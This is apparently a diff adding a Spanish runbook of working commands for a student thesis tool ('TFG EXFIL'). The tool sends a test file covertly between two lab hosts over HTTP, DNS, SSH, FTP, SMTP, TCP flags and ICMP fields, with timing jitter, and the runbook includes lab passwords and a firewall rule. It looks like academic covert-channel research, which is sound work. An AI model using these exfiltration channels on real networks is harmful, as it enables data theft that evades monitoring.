@@ -1,0 +1,111 @@
+==============================================================
+  COMANDOS EXITOSOS - TFG EXFIL
+  Servidor: 192.168.1.34 | Cliente: 192.168.1.79
+  Payload de prueba: C:/TFG-REPO/test_payload.txt
+  NOTA: Ejecutar siempre desde C:\TFG-REPO
+==============================================================
+
+--------------------------------------------------------------
+HTTP / METODO 1 (Headers)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP1 --canal HTTP --metodo 1 --host 0.0.0.0 --puerto 8080 --cifrado NINGUNO --out-file ./test/out_http1.bin
+[CLIENTE]  python tfg_cli.py send --canal HTTP --metodo 1 --host 192.168.1.34 --puerto 8080 --transfer-id RXHTTP1 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+HTTP / METODO 2 (Verb Sequence)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXHTTP2 --canal HTTP --metodo 2 --host 0.0.0.0 --puerto 8080 --cifrado NINGUNO --out-file ./test/out_http2.bin
+[CLIENTE]  python tfg_cli.py send --canal HTTP --metodo 2 --host 192.168.1.34 --puerto 8080 --transfer-id RXHTTP2 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+DNS / METODO 1 (Subdomains TXT)
+  NOTA: Servidor requiere privilegios de administrador (puerto 53)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXDNS1 --canal DNS --metodo 1 --host 0.0.0.0 --puerto 53 --cifrado NINGUNO --out-file ./test/out_dns1.bin
+[CLIENTE]  python tfg_cli.py send --canal DNS --metodo 1 --host 192.168.1.34 --puerto 53 --root-domain tfg.local --transfer-id RXDNS1 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+SSH / METODO 2 (Nombres de ficheros base32)
+  NOTA: Receptor se ejecuta en el servidor conectando a 127.0.0.1
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXSSH2 --canal SSH --metodo 2 --host 127.0.0.1 --puerto 22 --ssh-user Usuario --ssh-pass Orion_2003 --remote-dir C:/tfg_test --cifrado NINGUNO --out-file ./test/ssh/out_ssh2.bin
+[CLIENTE]  python tfg_cli.py send --canal SSH --metodo 2 --host 192.168.1.34 --puerto 22 --ssh-user Usuario --ssh-pass Orion_2003 --remote-dir C:/tfg_test --transfer-id RXSSH2 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+SSH / METODO 3 (Tamano de ficheros)
+  NOTA: Receptor se ejecuta en el servidor conectando a 127.0.0.1
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXSSH3 --canal SSH --metodo 3 --host 127.0.0.1 --puerto 22 --ssh-user Usuario --ssh-pass Orion_2003 --remote-dir C:/tfg_test --cifrado NINGUNO --out-file ./test/ssh/out_ssh3.bin
+[CLIENTE]  python tfg_cli.py send --canal SSH --metodo 3 --host 192.168.1.34 --puerto 22 --ssh-user Usuario --ssh-pass Orion_2003 --remote-dir C:/tfg_test --transfer-id RXSSH3 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+FTP / METODO 2 (Nombres de ficheros base32)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXFTP2 --canal FTP --metodo 2 --host 192.168.1.34 --puerto 21 --ftp-user ftproot --ftp-pass ftproot --cifrado NINGUNO --out-file ./test/ftp/out_ftp2.bin
+[CLIENTE]  python tfg_cli.py send --canal FTP --metodo 2 --host 192.168.1.34 --puerto 21 --ftp-user ftproot --ftp-pass ftproot --transfer-id RXFTP2 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+FTP / METODO 3 (Tamano de ficheros)
+  NOTA: Lanzar CLIENTE primero, luego SERVIDOR
+--------------------------------------------------------------
+[CLIENTE]  python tfg_cli.py send --canal FTP --metodo 3 --host 192.168.1.34 --puerto 21 --ftp-user ftproot --ftp-pass ftproot --transfer-id RXFTP3 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXFTP3 --canal FTP --metodo 3 --host 192.168.1.34 --puerto 21 --ftp-user ftproot --ftp-pass ftproot --cifrado NINGUNO --out-file ./test/ftp/out_ftp3.bin
+
+--------------------------------------------------------------
+SMTP / METODO 1 (Headers X-TFG-Data)
+  NOTA: Lanzar CLIENTE primero para que el email este en el buzon
+--------------------------------------------------------------
+[CLIENTE]  python tfg_cli.py send --canal SMTP --metodo 1 --smtp-host 192.168.1.34 --smtp-port 587 --smtp-user "user@lan.local" --smtp-pass password --smtp-to "user@lan.local" --smtp-from "tfg@lan.local" --smtp-no-starttls --transfer-id RXSMTP1 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXSMTP1 --canal SMTP --metodo 1 --imap-host 192.168.1.34 --imap-port 143 --imap-user "user@lan.local" --imap-pass password --cifrado NINGUNO --out-file ./test/smtp/out_smtp1.bin
+
+--------------------------------------------------------------
+TCP / METODO 1 (Flags)
+  NOTA: Servidor y cliente requieren privilegios de administrador
+        --ritmo-base-ms 50: delay base entre paquetes (ms)
+        --ritmo-dispersion-ms 20: variacion aleatoria +/- 20ms (delay real: 30-70ms)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP1 --canal TCP --metodo 1 --host 0.0.0.0 --puerto 9000 --cifrado NINGUNO --out-file ./test/tcp/out_tcp1.bin
+[CLIENTE]  python tfg_cli.py send --canal TCP --metodo 1 --host 192.168.1.34 --puerto 9000 --transfer-id RXTCP1 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt --ritmo-base-ms 50 --ritmo-dispersion-ms 20
+
+--------------------------------------------------------------
+TCP / METODO 2 (Sequence Number en SYN)
+  NOTA: Servidor y cliente requieren privilegios de administrador
+        --ritmo-base-ms 50: delay base entre paquetes (ms)
+        --ritmo-dispersion-ms 20: variacion aleatoria +/- 20ms (delay real: 30-70ms)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP2 --canal TCP --metodo 2 --host 0.0.0.0 --puerto 9000 --cifrado NINGUNO --out-file ./test/tcp/out_tcp2.bin
+[CLIENTE]  python tfg_cli.py send --canal TCP --metodo 2 --host 192.168.1.34 --puerto 9000 --transfer-id RXTCP2 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt --ritmo-base-ms 50 --ritmo-dispersion-ms 20
+
+--------------------------------------------------------------
+TCP / METODO 3 (Socket TCP con prefijo de longitud)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXTCP3 --canal TCP --metodo 3 --host 0.0.0.0 --puerto 9000 --cifrado NINGUNO --out-file ./test/tcp/out_tcp3.bin
+[CLIENTE]  python tfg_cli.py send --canal TCP --metodo 3 --host 192.168.1.34 --puerto 9000 --transfer-id RXTCP3 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt
+
+--------------------------------------------------------------
+ICMP / METODO 1 (Identifier)
+  NOTA: Servidor y cliente requieren privilegios de administrador
+        --ritmo-base-ms 50: delay base entre paquetes (ms)
+        --ritmo-dispersion-ms 20: variacion aleatoria +/- 20ms (delay real: 30-70ms)
+        Requiere regla de firewall: netsh advfirewall firewall add rule name="TFG ICMP" protocol=icmpv4:8,any dir=in action=allow
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP1 --canal ICMP --metodo 1 --host 0.0.0.0 --cifrado NINGUNO --out-file ./test/icmp/out_icmp1.bin
+[CLIENTE]  python tfg_cli.py send --canal ICMP --metodo 1 --host 192.168.1.34 --transfer-id RXICMP1 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt --ritmo-base-ms 50 --ritmo-dispersion-ms 20
+
+--------------------------------------------------------------
+ICMP / METODO 2 (Sequence Number)
+  NOTA: Servidor y cliente requieren privilegios de administrador
+        --ritmo-base-ms 50: delay base entre paquetes (ms)
+        --ritmo-dispersion-ms 20: variacion aleatoria +/- 20ms (delay real: 30-70ms)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP2 --canal ICMP --metodo 2 --host 0.0.0.0 --cifrado NINGUNO --out-file ./test/icmp/out_icmp2.bin
+[CLIENTE]  python tfg_cli.py send --canal ICMP --metodo 2 --host 192.168.1.34 --transfer-id RXICMP2 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt --ritmo-base-ms 50 --ritmo-dispersion-ms 20
+
+--------------------------------------------------------------
+ICMP / METODO 3 (TTL)
+  NOTA: Servidor y cliente requieren privilegios de administrador
+        --ritmo-base-ms 50: delay base entre paquetes (ms)
+        --ritmo-dispersion-ms 20: variacion aleatoria +/- 20ms (delay real: 30-70ms)
+--------------------------------------------------------------
+[SERVIDOR] python tfg_cli.py --plugins-dir plugins receive --transfer-id RXICMP3 --canal ICMP --metodo 3 --host 0.0.0.0 --cifrado NINGUNO --out-file ./test/icmp/out_icmp3.bin
+[CLIENTE]  python tfg_cli.py send --canal ICMP --metodo 3 --host 192.168.1.34 --transfer-id RXICMP3 --cifrado NINGUNO --recurso-tipo ARCHIVO --recurso-ubicacion C:/TFG-REPO/test_payload.txt --ritmo-base-ms 50 --ritmo-dispersion-ms 20
